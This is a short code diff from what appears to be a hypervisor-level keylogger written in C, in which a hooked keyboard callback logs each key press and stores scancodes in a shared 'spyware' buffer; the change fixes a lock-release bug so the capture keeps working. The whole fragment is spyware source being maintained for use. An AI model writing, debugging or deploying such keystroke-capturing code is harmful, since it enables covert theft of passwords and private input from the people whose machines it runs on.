@@ -58,7 +58,10 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
             LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
             AcquireLock(&shared_cores_data.spyware_data_lock);
 
-            if (shared_cores_data.spyware_data_buffer.length >= MAX_BUFFER_LENGTH) return;
+            if (shared_cores_data.spyware_data_buffer.length >= MAX_BUFFER_LENGTH){
+                ReleaseLock(&shared_cores_data.spyware_data_lock);
+                return;
+            } 
 
             shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = (byte_t)data_phys->MakeCode;
             shared_cores_data.spyware_data_buffer.length++;
